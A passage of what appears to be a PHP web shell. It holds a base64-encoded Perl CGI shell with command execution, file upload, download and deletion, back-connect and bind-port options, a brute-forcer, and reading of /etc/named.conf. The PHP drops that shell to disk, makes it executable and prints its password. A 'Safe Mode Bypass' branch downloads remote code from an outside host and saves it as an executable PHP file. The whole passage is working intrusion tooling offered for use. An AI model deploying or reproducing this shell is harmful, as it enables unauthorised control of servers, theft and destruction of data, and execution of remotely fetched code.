iMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUm1EaXIoJCkgDQp7DQoJbXkgJGRpciA9IHNoaWZ0Ow0KICAgIGlmKG9wZW5kaXIoRElSLCRkaXIpKQ0KCXsNCgkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCXsNCgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkNCgkJCXsNCgkJCQkkZmlsZT0gJGRpci4kUGF0aFNlcC4kZmlsZTsNCgkJCQlpZigtZCAkZmlsZSkNCgkJCQl7DQoJCQkJCSZSbURpcigkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXVubGluaygkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCWNsb3NlZGlyKERJUik7DQoJfQ0KCWlmKCFybWRpcigkZGlyKSkNCgl7DQoJCQ0KCX0NCn0NCnN1YiBGaWxlT3duZXIoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsNV07DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJcmV0dXJuICI/Pz8iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJG5hbWU9Z2V0cHd1aWQoJHVpZCk7DQoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7DQoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsNCgkJfQ0KCX0NCglyZXR1cm4gIj8/PyI7DQp9DQpzdWIgUGFyZW50Rm9sZGVyKCQpDQp7DQoJbXkgJHBhdGggPSBzaGlmdDsNCglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7DQoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOw0KCXJldHVybiAkcGF0aDsNCn0NCnN1YiBGaWxlUGVybXMoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCW15ICR1ciA9ICItIjsNCglteSAkdXcgPSAiLSI7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9DQoJCQlpZigtdyAkZmlsZSl7ICR1dyA9ICJ3IjsgfQ0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3Ow0KCQl9ZWxzZQ0KCQl7DQoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOw0KCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsNCgkJCXJldHVybiAkcmVzdWx0Ow0KCQl9DQoJfQ0KCXJldHVybiAiMDAwMCI7DQp9DQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07DQoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07DQoJCSR5ID0gJHkgKyAxOTAwOw0KCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87DQoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOw0KCQlyZXR1cm4gJGxtdGltZTsNCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIEZpbGVTaXplKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZiAkZmlsZSkNCgl7DQoJCXJldHVybiAtcyAkZmlsZTsNCgl9DQoJcmV0dXJuICIwIjsNCg0KfQ0Kc3ViIFBhcnNlRmlsZVNpemUoJCkNCnsNCglteSAkc2l6ZSA9IHNoaWZ0Ow0KCWlmKCRzaXplIDw9IDEwMjQpDQoJew0KCQlyZXR1cm4gJHNpemUuICIgQiI7DQoJfQ0KCWVsc2UNCgl7DQoJCWlmKCRzaXplIDw9IDEwMjQqMTAyNCkgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBLQiI7DQoJCX0NCgkJZWxzZSANCgkJew0KCQkJJHNpemUgPSBzcHJpbnRmKCIlLjJmIiwkc2l6ZSAvIDEwMjQgLyAxMDI0KTsNCgkJCXJldHVybiAkc2l6ZS4iIE1CIjsNCgkJfQ0KCX0NCn0NCnN1YiB0cmltKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmcgPX4gcy9eXHMrLy87DQoJJHN0cmluZyA9fiBzL1xzKyQvLzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBBZGRTbGFzaGVzKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmc9fiBzL1xcL1xcXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBMaXN0RGlyDQp7DQoJbXkgJHBhdGggPSAkQ3VycmVudERpci4kUGF0aFNlcDsNCgkkcGF0aD1+IHMvXFxcXC9cXC9nOw0KCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOw0KCWlmKC1kICRwYXRoKQ0KCXsNCgkJbXkgQGZuYW1lID0gKCk7DQoJCW15IEBkbmFtZSA9ICgpOw0KCQlpZihvcGVuZGlyKERJUiwkcGF0aCkpDQoJCXsNCgkJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQkJew0KCQkJCSRmPSRwYXRoLiRmaWxlOw0KCQkJCWlmKC1kICRmKQ0KCQkJCXsNCgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQlwdXNoKEBmbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQkJY2xvc2VkaXIoRElSKTsNCgkJfQ0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7DQoJCUBkbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBkbmFtZTsNCgkJJHJlc3VsdCAuPSAiPGRpdj48dGFibGUgd2lkdGg9JzkwJScgY2xhc3M9J2xpc3RkaXInPg0KDQoJCTx0ciBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjogIzNlM2UzZSc+PHRoPkZpbGUgTmFtZTwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5GaWxlIFNpemU8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+UGVybWlzc2lvbjwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTUwcHg7Jz5MYXN0IE1vZGlmaWVkPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOw0KCQlteSAkc3R5bGU9ImxpbmUiOw0KCQlteSAkaT0wOw0KCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZCA9ICZ0cmltKCRkKTsNCgkJCSRkaXJuYW1lPSRkOw0KCQkJaWYoJGQgZXEgIi4uIikgDQoJCQl7DQoJCQkJJGQgPSAmUGFyZW50Rm9sZGVyKCRwYXRoKTsNCgkJCX0NCgkJCWVsc2lmKCRkIGVxICIuIikgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aDsNCgkJCX0NCgkJCWVsc2UgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aC4kZDsNCgkJCX0NCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz4NCg0KCQkJPHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPjxhICBocmVmPSc/YT1ndWkmZD0iLiRkLiInPlsgIi4kZGlybmFtZS4iIF08L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOycgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZCkuIicsJyIuJGRpcm5hbWUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCIuJGkuIiwnIi4kZGlybmFtZS4iJylcIiA+Ii4mRmlsZVBlcm1zKCRkKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQlmb3JlYWNoIG15ICRmIChAZm5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZT0kZjsNCgkJCSRmID0gJHBhdGguJGY7DQoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyc+PGEgaHJlZj0nP2E9Y29tbWFuZCZkPSIuJHBhdGguIiZjPWVkaXQlMjAiLiRmaWxlLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mUGFyc2VGaWxlU2l6ZSgmRmlsZVNpemUoJGYpKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRmKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8L3RyPiI7DQoJCQkkaSsrOw0KCQl9DQoJCSRyZXN1bHQgLj0gIjwvdGFibGU+PC9kaXY+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRyeSB0byBWaWV3IExpc3QgVXNlcg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdEb21haW5Vc2VyDQp7DQoJb3BlbiAoZG9tYWlucywgJy9ldGMvbmFtZWQuY29uZicpIG9yICRlcnI9MTsNCglteSBAY256cyA9IDxkb21haW5zPjsNCgljbG9zZSBkMG1haW5zOw0KCW15ICRzdHlsZT0ibGluZSI7DQoJbXkgJHJlc3VsdD0iPGg1Pjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Ib2FuZyBTYSAtIFRydW9uZyBTYTwvZm9udD48L2g1PiI7DQoJaWYgKCRlcnIpDQoJew0KCQkkcmVzdWx0IC49ICAoJzxwPkMwdWxkblwndCBCeXBhc3MgaXQgLCBTb3JyeTwvcD4nKTsNCgkJcmV0dXJuICRyZXN1bHQ7DQoJfWVsc2UNCgl7DQoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOw0KCX0NCglmb3JlYWNoIG15ICRvbmUgKEBjbnpzKQ0KCXsNCgkJaWYoJG9uZSA9fiBtLy4qP3pvbmUgIiguKj8pIiB7LykNCgkJewkNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZW5hbWU9ICIvZXRjL3ZhbGlhc2VzLyIuJG9uZTsNCgkJCSRvd25lciA9IGdldHB3dWlkKChzdGF0KCRmaWxlbmFtZSkpWzRdKTsNCgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBWaWV3IExvZw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdMb2cNCnsNCglpZigkV2luTlQpDQoJew0KCQlyZXR1cm4gIjxoMj48Zm9udCBzdHlsZT0nZm9udDogMjBwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+RG9uJ3QgcnVuIG9uIFdpbmRvd3M8L2ZvbnQ+PC9oMj4iOw0KCX0NCglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOw0KCW15IEBwYXRobG9nPSgNCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLA0KCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLA0KCQkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2FjY2Vzc19sb2cnDQoJCQkJKTsNCglteSAkaT0wOw0KCW15ICRwZXJtczsNCglteSAkc2w7DQoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykNCgl7DQoJCWlmKC13ICRsb2cpDQoJCXsNCgkJCSRwZXJtcz0iT0siOw0KCQl9ZWxzZQ0KCQl7DQoJCQljaG9wKCRzbCA9IGBsbiAtcyAkbG9nIGVycm9yX2xvZ18kaWApOw0KCQkJaWYoJnRyaW0oJGxzKSBlcSAiIikNCgkJCXsNCgkJCQlpZigtciAkbHMpDQoJCQkJew0KCQkJCQkkcGVybXM9Ik9LIjsNCgkJCQkJJGxvZz0iZXJyb3JfbG9nXyIuJGk7DQoJCQkJfQ0KCQkJfWVsc2UNCgkJCXsNCgkJCQkkcGVybXM9Ijxmb250IHN0eWxlPSdjb2xvcjogcmVkOyc+Q2FuY2VsPGZvbnQ+IjsNCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49PDxFTkQ7DQoJCTx0cj4NCg0KCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+DQoJCQk8dGQ+PGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlRyeSIgLz48L3RkPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImxvZ18kaSIgbmFtZT0iYyIgdmFsdWU9Imxlc3MgJGxvZyIvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiIC8+DQoJCQk8L2Zvcm0+DQoJCQk8dGQ+JHBlcm1zPC90ZD4NCg0KCQk8L3RyPg0KRU5EDQoJCSRpKys7DQoJfQ0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCiRBY3Rpb24gPSAkaW57J2EnfTsNCg0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdA0KDQojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkDQokQ3VycmVudERpciA9ICZ0cmltKCRpbnsnZCd9KTsNCiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQ0KJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiIGlmKCRSdW5Db21tYW5kIGVxICIiKTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luDQp7DQoJJlBlcmZvcm1Mb2dpbjsNCn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCWlmKCEoJGNobW9kIGVxIDApKQ0KCQl7DQoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCQkJY2hvcCgkcmVzdWx0PSBgY2htb2QgJGNobW9kICIkZmlsZSJgKTsNCgkJCWlmKCZ0cmltKCRyZXN1bHQpIGVxICIiKQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJCX0NCgkJfQ0KCX0NCgkkcmVuYW1lPSRpbnsncmVuYW1lJ307DQoJaWYoISRyZW5hbWUgZXEgIiIpDQoJew0KCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkNCgkJew0KCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQkJCQ0KCQl9DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpDQoJew0KCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJfWVsc2UNCgl7DQoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoNCglwcmludCAmVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0DQp7DQoJJlByaW50UGFnZUhlYWRlcigiY2xpZW50cG9ydCIpOw0KCXByaW50ICZCYWNrQmluZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmQnJ1dGVGb3JjZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dubG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3TG9nOw0KDQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0RvbWFpblVzZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0NCiZQcmludFBhZ2VGb290ZXI7';
        $file = fopen('rot.cin', 'w+');
        $write = fwrite($file, base64_decode($cgishellizocin));
        fclose($file);
        chmod('rot.cin', 0755);
        echo '<a href=' . 'cgi/rot.cin' . ' target=_blank><br/><br/><b>password is r00t.infox1 [Click here]</b></a></center>';
    } elseif (isset($_GET['x']) && ('bysysfuncwexec' == $_GET['x'])) {
        echo '<br><center><span style="font-size:20px; font-family:Fredericka the Great; color:orange">Safe Mode Bypass</span><center>';
        mkdir('bypass-3', 0755);
        chdir('bypass-3');
        $bysyswsf = file_get_contents('http://base64.asia/txt/aypass.txt');
        $file = fopen('bypass-3.php', 'w+');
        $write = fwrite($file, $bysyswsf);
        fclose($file);
        chmod('bypass-3.php', 0755);
        echo '<a href=' . 'bypass-3/bypass-3.php' . ' target=_blank><br/><br/><b>Bypass.php [Click here]</b></a></center>';
    } elseif (isset($_GET['x']) && ('jumping' == $_GET['x'])) { ?>
				<form action="?path=<?php echo $pwd; ?>&amp;x=jumping" method="post">
